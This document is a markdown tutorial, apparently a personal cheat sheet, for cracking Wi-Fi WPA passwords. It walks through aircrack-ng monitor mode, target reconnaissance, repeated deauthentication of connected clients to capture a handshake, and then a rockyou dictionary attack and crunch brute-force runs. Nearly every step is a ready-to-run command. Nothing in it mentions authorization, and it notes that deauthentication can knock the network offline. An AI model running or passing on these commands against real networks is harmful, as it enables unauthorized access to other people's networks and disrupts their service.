preview: https://markdownlivepreview.com/  
##  Prerequisite  
```bash
sudo apt update
```  
```bash
# install aircrack
sudo apt install aircrack-ng
```  
```bash
# verify aircrack installation
aircrack-ng --help
```  
```bash
# install crunch
sudo apt install crunch
```  
```bash
# verify crunch installation
crunch -h
```  
And a goof wifi adapter who can do handshakes  
## A. Start general info  
`Default Folder`
```bash
# switch to super user
sudo su
```  
```bash
iwconfig
# see the network - it must be Mode:managed
```  
```bash
# this will show current running process
airmon-ng check
```  
```bash
# kill current process
airmon-ng check kill
# rechecking will show nothing this time
```  

## B. Change manager mode to monitor mode  
`same Default Folder`
```bash
airmon-ng start wlan0
# wlan0 can vary like wlan0mon etc
# this will change managed mode to monitor mode  
```  

## C. Gather basic info  
`same Default Folder`
```bash
airodump-ng wlan0
# stop the process (CTRL + C) after 10-15 secs
```  
create a text note of  
```txt
BSSID:
CH (channel):
ESSID:
```  

## D. Dump the capture file  
```
-|New_Folder
   |- Captured_Files
   |- rockyou (we will talk about this folder later)
```  
use this folder structure on desktop or anywhere  
```bash
# inside "Captured_Files" folder do `sudo su` & use
airodump-ng wlan0 -d <bssid>
# in some time you will see Handshake: bssid in top at the command  
# keep this process running
```  
`in same folder (Captured_Files) open another terminal`  
```bash
# de-auth
aireplay-ng --deauth 0 -a <bssid> wlan0
# this will start sending deauthentication codes  
# increasing number after --de-auth will lengthen the process & night shut the network for sometime  
# After some time usually 20secs close the execution (CTRL + C)  
```  
```bash
# this will capture the files  
airodump-ng -w file_name -c <ch> --bssid <bssid> wlan0
# close after 20secs
```  
```bash
# run the de-auth just to make sure things  
aireplay-ng --deauth 0 -a <bssid> wlan0
# close after 20secs

# re-run deauth
airodump-ng -w file_name -c <ch> --bssid <bssid> wlan0
# close after 20secs
```  
```bash
ls
# check the files in "Captured_Files" folder
# visible formats - csv, netxml, cap
```  

## E. Dictionary Attack (Method One)  
Download the rockyou file from internet, extract it & paste the `rockyou.txt` file in `rockyou` folder  
```
-|New_Folder
   |- Captured_Files
   |- rockyou (extract it & paste the `rockyou.txt` file here)
```  
`OR` we can use built in rockyou file from kali linux environment  
```bash
# optional if we skill download
gunzip -c /usr/share/wordlists/rockyou.txt.gz > ~/Desktop/New_Folder/rockyou/rockyou.txt
# sometimes this will be problematic so i choose download & use it  
```  
```bash
# change the permission
chmod 777 ~/Desktop/New_Folder/rockyou/rockyou.txt
# aircrack-ng file_name.cap -w <rockyou.txt path>
aircrack-ng file_name.cap -w /Desktop/New_Folder/rockyou/rockyou.txt
```  
wait for sometimes it will execute the process  

## F. Brute Force Attack (Method Two)  
this take too much time to penetrate  
F.1: Number only  
```bash
crunch 4 4 0123456789 | aircrack-ng file_name.cap -b <bssid> -w- 2>&1 | tee brute.txt
```  
F.2: Character Set  
```bash
crunch 8 8 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ | aircrack-ng file_name.cap -b <bssid> -w- 2>&1 | tee brute.txt
```  
F.3: Complex Character Set  
```bash
crunch 12 12 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+=-[]{}|;:'",.<>?/ | aircrack-ng file_name.cap -b <bssid> -w- 2>&1 | tee brute.txt
```  

## Post process  
```bash
# After all things done, do this before shutting OS
airmon-ng Stop wlan0
```  